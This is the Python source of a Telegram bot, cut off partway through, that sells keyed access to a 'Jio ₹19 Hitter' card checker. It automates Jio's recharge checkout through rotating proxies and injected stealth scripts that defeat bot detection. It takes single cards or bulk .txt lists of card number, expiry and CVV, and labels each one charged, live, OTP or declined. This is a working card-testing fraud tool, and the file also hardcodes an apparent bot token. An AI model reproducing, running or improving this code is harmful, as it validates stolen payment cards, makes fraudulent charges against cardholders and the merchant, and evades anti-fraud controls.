"""
H4 x Chk — Jio ₹19 Hitter (Railway Edition)
Owner: @whoh4rsh
"""
import asyncio, json, time, random, uuid, logging, os, sqlite3, shutil
from datetime import datetime
from threading import Thread
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
import uvicorn
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (ApplicationBuilder, ContextTypes, MessageHandler,
    CommandHandler, CallbackQueryHandler, filters)
from patchright.async_api import async_playwright, TimeoutError as PWTimeout

# ═══════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════
BOT_TOKEN = os.getenv("BOT_TOKEN", "8031306974:AAE2ibW3rH57WRjuLCmgEyTZeraArjjROoc")
OWNER_ID = int(os.getenv("OWNER_ID", "7077294261"))
OWNER_HANDLE = "@whoh4rsh"
BOT_NAME = "H4 x Chk"
BOT_LIFETIME_DAYS = 30
BOT_BORN = time.time()
DB_PATH = os.getenv("DB_PATH", "h4xchk.db")
HEADLESS = os.getenv("HEADLESS", "false").lower() == "true"
PORT = int(os.getenv("PORT", "7075"))

PLAN_PRICE = 19
PLAN_ID = "19"

JIO_RECHARGE_URL = "https://www.jio.com/selfcare/recharge/mobility/"
NAV_TIMEOUT = 45_000
JUSPAY_TIMEOUT = 30_000

RAW_PROXIES = [
    "in-free-proxy.g-w.info:59783",
    "px241104.pointtoserver.com:10780",
    "px400501.pointtoserver.com:10780",
    "px023005.pointtoserver.com:10780",
    "px051003.pointtoserver.com:10780",
    "px040805.pointtoserver.com:10780",
]
proxy_index = 0

# Concurrency lock — Railway pe 1 check at a time (OOM se bachne ke liye)
_check_lock = asyncio.Lock()

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
]

VIEWPORTS = [
    {"width": 1920, "height": 1080},
    {"width": 1536, "height": 864},
    {"width": 1440, "height": 900},
    {"width": 1366, "height": 768},
]

STEALTH_JS = """
Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
delete Object.getPrototypeOf(navigator).webdriver;
window.chrome = {runtime: {}, loadTimes: function() {}, csi: function() {}, app: {isInstalled: false}};
Object.defineProperty(navigator, 'plugins', {get: () => [
    {name: 'PDF Viewer', filename: 'internal-pdf-viewer'},
    {name: 'Chrome PDF Viewer', filename: 'internal-pdf-viewer'},
    {name: 'Chromium PDF Viewer', filename: 'internal-pdf-viewer'},
]});
Object.defineProperty(navigator, 'mimeTypes', {get: () => [{type: 'application/pdf'}, {type: 'text/pdf'}]});
Object.defineProperty(navigator, 'languages', {get: () => ['en-IN', 'en-US', 'en']});
Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8});
Object.defineProperty(navigator, 'deviceMemory', {get: () => 8});
Object.defineProperty(navigator, 'maxTouchPoints', {get: () => 0});
const getParameter = WebGLRenderingContext.prototype.getParameter;
WebGLRenderingContext.prototype.getParameter = function(p) {
    if (p === 37445) return 'Intel Inc.';
    if (p === 37446) return 'Intel Iris OpenGL Engine';
    return getParameter.call(this, p);
};
const originalQuery = window.navigator.permissions.query;
window.navigator.permissions.query = (parameters) => (
    parameters.name === 'notifications'
        ? Promise.resolve({state: Notification.permission})
        : originalQuery(parameters)
);
Object.defineProperty(HTMLIFrameElement.prototype, 'contentWindow', {get: function() { return window; }});
Object.defineProperty(Notification, 'permission', {get: () => 'default'});
delete window.__playwright; delete window.__pw_manual; delete window.__PW_inspect;
delete window._puppeteer_; delete window._selenium; delete window.callPhantom;
delete window._phantom; delete window.__nightmare;
const nativeToString = Function.prototype.toString;
Function.prototype.toString = function() {
    if (this === Function.prototype.toString) return 'function toString() { [native code] }';
    return nativeToString.call(this);
};
Date.prototype.getTimezoneOffset = function() { return -330; };
if (navigator.getBattery) {
    navigator.getBattery = () => Promise.resolve({charging: true, chargingTime: 0, dischargingTime: Infinity, level: 1});
}
"""

logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
logger = logging.getLogger("h4xchk")
api_app = FastAPI(title="H4 x Chk API", version="15.0")

# ═══════════════════════════════════════════════════════════
# BROWSER PATH (Railway fix)
# ═══════════════════════════════════════════════════════════
def get_browser_path():
    """Find system chromium on Railway/Nix."""
    for name in ["chromium", "chromium-browser", "google-chrome", "chrome", "chrome-headless-shell"]:
        path = shutil.which(name)
        if path:
            logger.info(f"✅ System browser: {path}")
            return path
    logger.warning("⚠️ No system browser found, using patchright default")
    return None

# ═══════════════════════════════════════════════════════════
# DB
# ═══════════════════════════════════════════════════════════
def db_init():
    con = sqlite3.connect(DB_PATH); cur = con.cursor()
    cur.execute("""CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT,
        first_seen INTEGER, banned INTEGER DEFAULT 0, role TEXT DEFAULT 'user',
        live_checks INTEGER DEFAULT 0, lifetime INTEGER DEFAULT 0)""")
    cur.execute("""CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY, days INTEGER,
        max_uses INTEGER, used_count INTEGER DEFAULT 0, created_at INTEGER, expires_at INTEGER,
        created_by INTEGER, bound_to INTEGER DEFAULT 0, cc_limit INTEGER DEFAULT 50)""")
    cur.execute("""CREATE TABLE IF NOT EXISTS redemptions (user_id INTEGER PRIMARY KEY,
        key TEXT, activated INTEGER, expires_at INTEGER, cc_used INTEGER DEFAULT 0, cc_limit INTEGER DEFAULT 50)""")
    cur.execute("""CREATE TABLE IF NOT EXISTS feedback (id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER, username TEXT, message TEXT, created_at INTEGER)""")
    cur.execute("""CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY CHECK (id=1),
        total_checks INTEGER DEFAULT 0, total_hits INTEGER DEFAULT 0,
        jio_checks INTEGER DEFAULT 0, otp_count INTEGER DEFAULT 0)""")
    cur.execute("INSERT OR IGNORE INTO stats (id) VALUES (1)")
    con.commit(); con.close()

def db(): return sqlite3.connect(DB_PATH)

def ensure_user(uid, un=""):
    con = db(); cur = con.cursor()
    cur.execute("SELECT user_id FROM users WHERE user_id=?", (uid,))
    if not cur.fetchone():
        cur.execute("INSERT INTO users (user_id,username,first_seen,role) VALUES (?,?,?,?)",
            (uid, un or "", int(time.time()), "owner" if uid==OWNER_ID else "user"))
    elif un:
        cur.execute("UPDATE users SET username=? WHERE user_id=?", (un, uid))
    con.commit(); con.close()

def get_user(uid):
    con = db(); cur = con.cursor()
    cur.execute("SELECT user_id,username,first_seen,banned,role,live_checks,lifetime FROM users WHERE user_id=?", (uid,))
    r = cur.fetchone(); con.close()
    if not r: return None
    return {"user_id":r[0],"username":r[1],"first_seen":r[2],"banned":r[3],"role":r[4],"live_checks":r[5],"lifetime":r[6]}

def is_owner(uid): return uid == OWNER_ID
def is_admin(uid):
    u = get_user(uid); return bool(u and u["role"] in ("owner","admin"))
def is_banned(uid):
    u = get_user(uid); return bool(u and u["banned"])

def get_active_key(uid):
    con = db(); cur = con.cursor()
    cur.execute("SELECT key,activated,expires_at,cc_used,cc_limit FROM redemptions WHERE user_id=?", (uid,))
    r = cur.fetchone(); con.close()
    if not r: return None
    k,a,e,cu,cl = r
    if not a or e < int(time.time()): return None
    return {"key":k,"expires_at":e,"cc_used":cu,"cc_limit":cl}

def key_days_left(uid):
    k = get_active_key(uid); return 0 if not k else max(0,(k["expires_at"]-int(time.time()))//86400)
def cc_limit_left(uid):
    k = get_active_key(uid); return 0 if not k else max(0, k["cc_limit"]-k["cc_used"])
def has_access(uid):
    if is_owner(uid) or is_admin(uid): return True
    return get_active_key(uid) is not None

def consume_cc(uid):
    if is_owner(uid) or is_admin(uid): return True
    k = get_active_key(uid)
    if not k: return False
    if k["cc_used"] >= k["cc_limit"]: return False
    con = db(); cur = con.cursor()
    cur.execute("UPDATE redemptions SET cc_used=cc_used+1 WHERE user_id=?", (uid,))
    con.commit(); con.close(); return True

def refund_cc(uid):
    if is_owner(uid) or is_admin(uid): return
    con = db(); cur = con.cursor()
    cur.execute("UPDATE redemptions SET cc_used=cc_used-1 WHERE user_id=? AND cc_used>0", (uid,))
    con.commit(); con.close()

def bump_live(uid):
    con = db(); cur = con.cursor()
    cur.execute("UPDATE users SET live_checks=live_checks+1, lifetime=lifetime+1 WHERE user_id=?", (uid,))
    cur.execute("UPDATE stats SET total_checks=total_checks+1, jio_checks=jio_checks+1 WHERE id=1")
    con.commit(); con.close()

def bump_hit():
    con = db(); cur = con.cursor()
    cur.execute("UPDATE stats SET total_hits=total_hits+1 WHERE id=1")
    con.commit(); con.close()

def bump_otp():
    con = db(); cur = con.cursor()
    cur.execute("UPDATE stats SET otp_count=otp_count+1 WHERE id=1")
    con.commit(); con.close()

def reset_live(uid):
    con = db(); cur = con.cursor()
    cur.execute("UPDATE users SET live_checks=0 WHERE user_id=?", (uid,)); con.commit(); con.close()
def reset_cc(uid):
    con = db(); cur = con.cursor()
    cur.execute("UPDATE redemptions SET cc_used=0 WHERE user_id=?", (uid,)); con.commit(); con.close()
def set_cc_limit(uid, limit):
    con = db(); cur = con.cursor()
    cur.execute("UPDATE redemptions SET cc_limit=? WHERE user_id=?", (limit, uid)); con.commit(); con.close()
def bot_days_left(): return max(0, BOT_LIFETIME_DAYS - (time.time()-BOT_BORN)//86400)

def gen_key(days, uses, cc_limit, by):
    raw = f"H4X-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:8].upper()}"
    con = db(); cur = con.cursor()
    cur.execute("INSERT INTO keys (key,days,max_uses,created_at,expires_at,created_by,cc_limit) VALUES (?,?,?,?,?,?,?)",
        (raw,days,uses,int(time.time()),int(time.time())+days*86400,by,cc_limit))
    con.commit(); con.close(); return raw

def redeem_key(uid, key):
    con = db(); cur = con.cursor()
    cur.execute("SELECT key,days,max_uses,used_count,expires_at,bound_to,cc_limit FROM keys WHERE key=?", (key,))
    r = cur.fetchone()
    if not r: con.close(); return False, "❌ Invalid key."
    k,d,mu,uc,exp,bt,cl = r
    if uc >= mu: con.close(); return False, "❌ Key maxed."
    if exp < int(time.time()): con.close(); return False, "❌ Key expired."
    if bt and bt != uid: con.close(); return False, "❌ Bound."
    ne = int(time.time())+d*86400
    cur.execute("INSERT OR REPLACE INTO redemptions (user_id,key,activated,expires_at,cc_used,cc_limit) VALUES (?,?,?,?,?,?)",
        (uid,key,1,ne,0,cl))
    cur.execute("UPDATE keys SET used_count=used_count+1, bound_to=? WHERE key=?", (uid,key))
    con.commit(); con.close()
    return True, f"✅ Key redeemed · {d}d · {cl} CC limit."

# ═══════════════════════════════════════════════════════════
# PROXY
# ═══════════════════════════════════════════════════════════
def fmt_proxy(raw):
    raw = raw.strip()
    if not raw: return None
    if "://" in raw: return raw
    p = raw.split(":")
    if len(p) == 4: return f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
    elif len(p) == 2: return f"http://{raw}"
    return None

def get_proxy():
    global proxy_index
    if not RAW_PROXIES: return None
    p = RAW_PROXIES[proxy_index % len(RAW_PROXIES)]; proxy_index += 1
    return fmt_proxy(p)

def _parse_proxy_cfg(proxy):
    if not proxy: return None
    if "@" in proxy:
        scheme, rest = proxy.split("://", 1) if "://" in proxy else ("http", proxy)
        auth, hostport = rest.split("@", 1)
        user, pwd = auth.split(":", 1)
        return {"server": f"{scheme}://{hostport}", "username": user, "password": pwd}
    return {"server": proxy}

# ═══════════════════════════════════════════════════════════
# PLAYWRIGHT ENGINE
# ═══════════════════════════════════════════════════════════
async def _human_delay(min_ms=400, max_ms=1200):
    await asyncio.sleep(random.uniform(min_ms, max_ms) / 1000)

async def _human_type(locator, text):
    await locator.click()
    await asyncio.sleep(random.uniform(0.1, 0.3))
    for ch in text:
        await locator.type(ch, delay=random.randint(40, 180))
    await asyncio.sleep(random.uniform(0.2, 0.5))

async def jio19_playwright(cc, mm, yy, cvv, mobile="", proxy=None, log_cb=None):
    """Serialized — 1 check at a time (Railway RAM safe)."""
    async with _check_lock:
        return await _jio19_impl(cc, mm, yy, cvv, mobile, proxy, log_cb)

async def _jio19_impl(cc, mm, yy, cvv, mobile="", proxy=None, log_cb=None):
    start = time.time()
    yy_f = yy[2:] if len(yy) == 4 else yy
    result = {
        "status": "error", "response": "INIT", "code": "PW-000",
        "time": "0.00s", "card": f"{cc}|{mm}|{yy}|{cvv}",
        "AMOUNT": "Rs 19", "PLAN": "19", "NUMBER": mobile or "",
        "proxy": proxy or "direct", "gate": "Jio19-PW",
    }
    if not mobile:
        mobile = f"9{random.randint(100000000, 999999999)}"

    async def _log(msg, emoji="⏳"):
        if log_cb:
            try: await log_cb(msg, emoji, f"{(time.time()-start):.1f}s")
            except Exception: pass

    proxy_cfg = _parse_proxy_cfg(proxy)
    browser = None; context = None
    await _log("Init", "⚡")

    try:
        async with async_playwright() as p:
            launch_args = [
                "--disable-blink-features=AutomationControlled",
                "--disable-features=IsolateOrigins,site-per-process",
                "--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
                "--no-first-run", "--no-default-browser-check",
                "--disable-infobars", "--window-size=1920,1080",
                "--start-maximized", "--lang=en-IN",
                "--single-process",  # ← Railway RAM optimization
            ]
            await _log("Browser launching", "⏳")
            _chrome = get_browser_path()
            _launch_kw = {"headless": HEADLESS, "args": launch_args}
            if _chrome:
                _launch_kw["executable_path"] = _chrome
            browser = await p.chromium.launch(**_launch_kw)
            await _log("Browser ready", "✅")

            context = await browser.new_context(
                user_agent=random.choice(UA_POOL),
                viewport=random.choice(VIEWPORTS),
                locale="en-IN", timezone_id="Asia/Kolkata",
                geolocation={"latitude": 19.0760, "longitude": 72.8777},
                permissions=["geolocation"], color_scheme="light",
                device_scale_factor=1, is_mobile=False, has_touch=False,
                java_script_enabled=True, proxy=proxy_cfg,
                extra_http_headers={
                    "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8",
                    "Sec-Ch-Ua": '"Chromium";v="131", "Not_A Brand";v="24"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": '"Windows"',
                    "Upgrade-Insecure-Requests": "1",
                },
            )
            await context.add_init_script(STEALTH_JS)
            await _log("Stealth injected", "✅")

            page = await context.new_page()
            await _log("Page created", "✅")

            await _log("Opening jio.com", "⏳")
            try:
                await page.goto("https://www.jio.com/", timeout=NAV_TIMEOUT,
                                wait_until="domcontentloaded")
                await _human_delay(1500, 3000)
                await page.mouse.move(random.randint(300, 800), random.randint(200, 500))
                await page.evaluate(f"window.scrollBy(0, {random.randint(100, 300)})")
                await _human_delay(800, 1500)
                await _log("jio.com loaded", "✅")
            except Exception as e:
                await _log(f"jio.com fail: {str(e)[:25]}", "⚠️")

            await _log("Opening recharge page", "⏳")
            await page.goto(JIO_RECHARGE_URL, timeout=NAV_TIMEOUT,
                            wait_until="domcontentloaded")
            await _log("Recharge page loaded", "✅")

            await _log("Cloudflare check", "🔍")
            cf_hit = False
            for i in range(15):
                title = (await page.title()).lower()
                body = ""
                try: body = (await page.inner_text("body")).lower()[:500]
                except Exception: pass
                if "just a moment" in title or "checking" in body or "verify you are human" in body:
                    cf_hit = True
                    await _log(f"CF challenge ({i+1}/15)", "🛡️")
                    await asyncio.sleep(2)
                else:
                    break
            await _log("Cloudflare passed" if cf_hit else "No Cloudflare", "✅")

            await _log("Finding mobile field", "🔍")
            try:
                mf = page.locator(
                    "input[type='tel'], input[name*='mobile' i], "
                    "input[id*='mobile' i], input[placeholder*='mobile' i]"
                ).first
                await mf.wait_for(state="visible", timeout=10000)
                await _log("Mobile field found", "✅")
                await _human_type(mf, mobile)
                await _log(f"Mobile: {mobile}", "✅")
            except PWTimeout:
                await _log("Mobile field NOT found", "❌")
                result.update(status="error", response="Mobile field not found",
                              code="PW-101", time=f"{(time.time()-start):.2f}s")
                return result

            await _human_delay(1000, 2000)

            await _log("Searching ₹19 plan", "🔍")
            try:
                plan = page.locator("text=/₹\\s*19\\b/").first
                await plan.wait_for(state="visible", timeout=10000)
                await plan.click()
                await _log("₹19 plan selected", "✅")
            except PWTimeout:
                await _log("₹19 plan NOT found", "❌")
                result.update(status="error", response="₹19 plan not found",
                              code="PW-102", time=f"{(time.time()-start):.2f}s")
                return result

            await _human_delay(800, 1500)

            await _log("Clicking Proceed", "⏳")
            for label in ["Recharge", "Proceed", "Pay", "Continue"]:
                try:
                    btn = page.locator(f"button:has-text('{label}')").first
                    if await btn.is_visible(timeout=2000):
                        await btn.click()
                        await _log(f"'{label}' clicked", "✅")
                        break
                except Exception:
                    continue

            await _human_delay(3000, 5000)

            await _log("Waiting Juspay iframe", "⏳")
            card_frame = None
            for i in range(10):
                for fr in page.frames:
                    u = (fr.url or "").lower()
                    if "juspay" in u or "checkout" in u or "pay" in u:
                        card_frame = fr
                        await _log(f"Juspay iframe ({i+1}/10)", "✅")
                        break
                if card_frame: break
                await asyncio.sleep(1)
            if not card_frame:
                await _log("Iframe NOT found — main page", "⚠️")
                card_frame = page

            await _log("Finding card fields", "🔍")
            try:
                cn = card_frame.locator(
                    "input[name*='card_number' i], input[autocomplete='cc-number'], "
                    "input[id*='cardNumber' i], input[placeholder*='card number' i]"
                ).first
                await cn.wait_for(state="visible", timeout=JUSPAY_TIMEOUT)
                await _human_type(cn, cc)
                await _log("Card number filled", "✅")

                exp = card_frame.locator(
                    "input[name*='expiry' i], input[autocomplete='cc-exp'], input[id*='expiry' i]"
                ).first
                await _human_type(exp, f"{mm}/{yy_f}")
                await _log(f"Expiry: {mm}/{yy_f}", "✅")

                cv = card_frame.locator(
                    "input[name*='cvv' i], input[autocomplete='cc-csc'], input[id*='cvv' i]"
                ).first
                await _human_type(cv, cvv)
                await _log("CVV filled", "✅")
            except PWTimeout:
                await _log("Card fields NOT found", "❌")
                result.update(status="error", response="Card fields not found",
                              code="PW-103", time=f"{(time.time()-start):.2f}s")
                return result

            await _human_delay(600, 1200)
            await _log("Clicking Pay", "⏳")
            try:
                sub = card_frame.locator(
                    "button:has-text('Pay'), button[type='submit'], button:has-text('Continue')"
                ).first
                await sub.click(timeout=8000)
                await _log("Pay clicked", "✅")
            except PWTimeout:
                await _log("Pay NOT found", "⚠️")

            await _log("Waiting response", "⏳")
            await asyncio.sleep(6)

            body_text = ""
            for fr in page.frames:
                try: body_text += (await fr.inner_text("body")) + "\n"
                except Exception: pass

            tl = body_text.lower()
            result["time"] = f"{(time.time()-start):.2f}s"

            if any(k in tl for k in ["otp", "one time password", "3d secure",
                                      "enter otp", "verify", "authentication",
                                      "securecode", "vbv", "challenge"]):
                await _log("OTP screen detected", "🔐")
                result.update(status="otp", response="OTP_REQUIRED (3DS)", code="PW-OTP")
                return result

            if any(k in tl for k in ["success", "payment successful",
                                      "recharge successful", "thank you"]):
                await _log("Payment SUCCESS", "💎")
                result.update(status="charged", response="Payment Successful", code="TXN_SUCCESS")
                return result

            if any(k in tl for k in ["insufficient", "not enough", "limit exceeded", "balance low"]):
                await _log("Card LIVE — insufficient", "✅")
                result.update(status="approved", response="INSUFFICIENT_FUNDS (Card Live)", code="PW-LIVE")
                return result

            if any(k in tl for k in ["declined", "failed", "rejected",
                                      "invalid card", "not authorized"]):
                await _log("Card DECLINED", "❌")
                result.update(status="declined", response="Declined", code="PW-DEC")
                return result

            await _log("Unknown response", "❓")
            result.update(status="declined", response="Unknown response", code="PW-UNK")
            return result

    except Exception as e:
        logger.warning(f"PW error: {str(e)[:80]}")
        await _log(f"Error: {str(e)[:40]}", "⚠️")
        result.update(status="error", response=f"PW_ERROR ({str(e)[:60]})",
                      code="PW-500", time=f"{(time.time()-start):.2f}s")
        return result
    finally:
        try:
            if context: await context.close()
            if browser: await browser.close()
        except Exception: pass

# ═══════════════════════════════════════════════════════════
# LIVE LOGGER
# ═══════════════════════════════════════════════════════════
class LiveLogger:
    def __init__(self, bot, chat_id, card_masked, proxy, max_lines=15,
                 min_edit_interval=1.5):
        self.bot = bot; self.chat_id = chat_id; self.card = card_masked
        self.proxy = proxy; self.max_lines = max_lines
        self.min_edit_interval = min_edit_interval
        self.lines = []; self.msg = None; self.start = time.time()
        self._last_edit = 0.0; self._lock = asyncio.Lock(); self._pending = False

    def _render(self, status_line=""):
        elapsed = f"{time.time()-self.start:.1f}s"
        header = (
            f"╔══════════════════════════════════╗\n"
            f"║  📱 JIO ₹19 — LIVE CHECK 💎\n"
            f"╠══════════════════════════════════╣\n"
            f"║  💳 {self.card}\n"
            f"║  🌐 {self.proxy}\n"
            f"║  ⏱️  {elapsed}\n"
            f"╠══════════════════════════════════╣\n"
            f"║  📋 LOGS\n"
        )
        shown = self.lines[-self.max_lines:]
        log_block = ""
        for emoji, ts, msg in shown:
            log_block += f"║  {emoji} {ts} {msg[:28]}\n"
        footer = ""
        if status_line:
            footer = f"╠══════════════════════════════════╣\n║  {status_line}\n"
        footer += "╚══════════════════════════════════╝"
        return f"```\n{header}{log_block}{footer}\n```"

    async def log(self, msg, emoji="⏳", ts=None):
        async with self._lock:
            ts = ts or f"{time.time()-self.start:.1f}s"
            self.lines.append((emoji, ts, msg))
            now = time.time()
            if now - self._last_edit < self.min_edit_interval:
                self._pending = True; return
            self._last_edit = now; self._pending = False
            await self._flush()

    async def _flush(self):
        text = self._render()
        try:
            if self.msg is None:
                self.msg = await self.bot.send_message(self.chat_id, text, parse_mode="Markdown")
            else:
                await self.msg.edit_text(text, parse_mode="Markdown")
        except Exception as e:
            logger.warning(f"LiveLogger edit fail: {str(e)[:60]}")

    async def finish(self, status, response, code):
        emoji_map = {
            "charged": "💎 CHARGED", "approved": "✅ APPROVED (LIVE)",
            "declined": "❌ DECLINED", "dead": "☠️ DEAD",
            "otp": "🔐 OTP — SKIPPED", "error": "⚠️ ERROR", "skip": "⏭️ SKIPPED",
        }
        status_line = f"{emoji_map.get(status, status.upper())} · {code}"
        async with self._lock:
            self.lines.append(("🏁", f"{time.time()-self.start:.1f}s",
                               f"Done: {response[:30]}"))
            self._last_edit = time.time()
            text = self._render(status_line=status_line)
            try:
                if self.msg is None:
                    self.msg = await self.bot.send_message(self.chat_id, text, parse_mode="Markdown")
                else:
                    await self.msg.edit_text(text, parse_mode="Markdown")
            except Exception as e:
                logger.warning(f"LiveLogger finish edit fail: {str(e)[:60]}")

# ═══════════════════════════════════════════════════════════
# API
# ═══════════════════════════════════════════════════════════
class Jio19Request(BaseModel):
    cc:str; mm:str; yy:str; cvv:str; mobile:str=""; user_id:int=0

@api_app.post("/api/jio19")
async def api_jio19(req: Jio19Request):
    if req.user_id and not has_access(req.user_id):
        raise HTTPException(403, "No active key")
    if req.user_id and not consume_cc(req.user_id):
        raise HTTPException(429, "CC limit reached")
    proxy = get_proxy()
    r = await jio19_playwright(req.cc, req.mm, req.yy, req.cvv,
                                mobile=req.mobile, proxy=proxy)
    if req.user_id:
        bump_live(req.user_id)
        if r["status"] in ("charged","approved"): bump_hit()
        elif r["status"] == "otp": bump_otp()
    return r

@api_app.get("/")
async def api_root():
    return {"status": "ok", "bot": BOT_NAME, "owner": OWNER_HANDLE}

# ═══════════════════════════════════════════════════════════
# UI HELPERS
# ═══════════════════════════════════════════════════════════
def fmt_time(s):
    m, sec = divmod(int(s), 60)
    return f"{m}m {sec}s" if m else f"{sec}s"

def main_menu_kb(uid):
    rows = [
        [InlineKeyboardButton("📱 Jio ₹19 Hitter", callback_data="ui_jio19")],
        [InlineKeyboardButton("📂 Mass Check (.txt)", callback_data="ui_chk"),
         InlineKeyboardButton("📊 Live Stats", callback_data="ui_stats")],
        [InlineKeyboardButton("💎 My Account", callback_data="ui_info"),
         InlineKeyboardButton("🔑 Redeem Key", callback_data="ui_redeem")],
        [InlineKeyboardButton("💬 Feedback", callback_data="ui_fb"),
         InlineKeyboardButton("📖 Help", callback_data="ui_help")],
    ]
    if uid == OWNER_ID or is_admin(uid):
        rows.append([InlineKeyboardButton("👑 Admin Panel", callback_data="ui_admin")])
    return InlineKeyboardMarkup(rows)

def admin_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Gen Key", callback_data="ad_genkey"),
         InlineKeyboardButton("📊 Bot Stats", callback_data="ad_stats")],
        [InlineKeyboardButton("👥 Users", callback_data="ad_users"),
         InlineKeyboardButton("📩 Feedback", callback_data="ad_fb")],
        [InlineKeyboardButton("⬅️ Back", callback_data="ui_main")],
    ])

def back_kb(target="ui_main", label="⬅️ Back"):
    return InlineKeyboardMarkup([[InlineKeyboardButton(label, callback_data=target)]])

def user_card(u, uid):
    live = u["live_checks"] if u else 0
    life = u["lifetime"] if u else 0
    kd = key_days_left(uid); cl = cc_limit_left(uid); k = get_active_key(uid)
    used = k["cc_used"] if k else 0; lim = k["cc_limit"] if k else 0
    role = u['role'] if u else 'guest'
    role_emoji = {"owner": "👑", "admin": "⭐", "user": "👤"}.get(role, "👤")
    return (
        f"╔══════════════════════════════════╗\n"
        f"║  💎 **{BOT_NAME}** — PROFILE\n"
        f"╠══════════════════════════════════╣\n"
        f"║  {role_emoji} Role    · `{role.upper()}`\n"
        f"║  🆔 ID      · `{uid}`\n"
        f"║  ⚡ Live    · `{live}`\n"
        f"║  📊 Lifetime· `{life}`\n"
        f"╠══════════════════════════════════╣\n"
        f"║  🔑 Key     · `{kd}` day(s)\n"
        f"║  💳 CC Used · `{used}/{lim}`\n"
        f"║  🎯 Left    · `{cl}`\n"
        f"╠══════════════════════════════════╣\n"
        f"║  🤖 Bot Life· `{bot_days_left()}` day(s)\n"
        f"╚══════════════════════════════════╝"
    )

def welcome_text(u, uid):
    name = u.first_name if u else "User"
    username = f"@{u.username}" if u and u.username else "—"
    role = "OWNER" if uid == OWNER_ID else ("ADMIN" if is_admin(uid) else "USER")
    role_emoji = {"OWNER": "👑", "ADMIN": "⭐", "USER": "👤"}[role]
    return (
        f"╔══════════════════════════════════╗\n"
        f"║                                  ║\n"
        f"║   📱 **JIO ₹19 HITTER** 💎        ║\n"
        f"║                                  ║\n"
        f"║   ⚡ **PREMIUM EDITION** ⚡       ║\n"
        f"║                                  ║\n"
        f"╚══════════════════════════════════╝\n\n"
        f"👋 **Welcome, {name}!**\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔐 **Access Required**\n"
        f"Contact → {OWNER_HANDLE}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 **Your Info**\n"
        f"  {role_emoji} Role  · `{role}`\n"
        f"  🆔 ID    · `{uid}`\n"
        f"  👤 User  · {username}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 **Features**\n"
        f"  ✅ Live inline step logs\n"
        f"  ✅ Cloudflare bypass\n"
        f"  ✅ Auto OTP skip\n"
        f"  ✅ Mass .txt checking\n"
        f"  ✅ Real-time progress\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🚀 **Ready to start?**\n"
        f"Tap below to begin checking 💎"
    )

def jio19_text():
    return (
        f"╔══════════════════════════════════╗\n"
        f"║   📱 **JIO ₹19 HITTER** 💎        ║\n"
        f"╠══════════════════════════════════╣\n"
        f"║  💰 Amount  · `₹{PLAN_PRICE}`\n"
        f"║  📅 Days    · `1 day`\n"
        f"║  📶 Data    · `1GB total`\n"
        f"║  🎯 Gate    · `Jio Prepaid`\n"
        f"╠══════════════════════════════════╣\n"
        f"║  ✅ Live inline logs\n"
        f"║  ✅ Cloudflare bypass\n"
        f"║  ✅ Auto OTP skip\n"
        f"╚══════════════════════════════════╝\n\n"
        f"📝 **How to use:**\n"
        f"`/jio cc|mm|yy|cvv [mobile]`\n\n"
        f"💡 **Example:**\n"
        f"`/jio 4111111111111111|12|25|123 9876543210`\n\n"
        f"🚀 Ya seedha card bhej do 💎"
    )

def chk_text():
    return (
        f"╔══════════════════════════════════╗\n"
        f"║   📂 **MASS CHECK** 💎            ║\n"
        f"╠══════════════════════════════════╣\n"
        f"║  📄 Format  · `.txt` file\n"
        f"║  📝 Pattern · `cc|mm|yy|cvv`\n"
        f"║  🎯 Gate    · `Jio ₹19`\n"
        f"║  ⚡ Live    · `per-card logs`\n"
        f"╚══════════════════════════════════╝\n\n"
        f"📝 **How to use:**\n"
        f"1️⃣ `.txt` file bhejo cards ke saath\n"
        f"2️⃣ File pe **reply** karo `/chk`\n"
        f"3️⃣ Ya file caption me `/chk` likho\n\n"
        f"📋 **File format:**\n"
        f"```\n"
        f"4111111111111111|12|25|123\n"
        f"5555555555554444|01|26|456\n"
        f"```\n\n"
        f"🚀 Bot automatically mass check shuru karega 💎"
    )

def help_text():
    return (
        f"╔══════════════════════════════════╗\n"
        f"║   📖 **HELP — COMMANDS** 💎       ║\n"
        f"╠══════════════════════════════════╣\n"
        f"║  🎯 **USER COMMANDS**\n"
        f"║  ▸ `/start` — Main menu\n"
        f"║  ▸ `/menu` — Menu\n"
        f"║  ▸ `/jio` — Single check\n"
        f"║  ▸ `/chk` — Mass check\n"
        f"║  ▸ `/redeem` — Activate key\n"
        f"║  ▸ `/myinfo` — Profile\n"
        f"║  ▸ `/feedback` — Send msg\n"
        f"╠══════════════════════════════════╣\n"
        f"║  👑 **ADMIN**\n"
        f"║  ▸ `/genkey` — Generate key\n"
        f"║  ▸ `/ban` `/unban`\n"
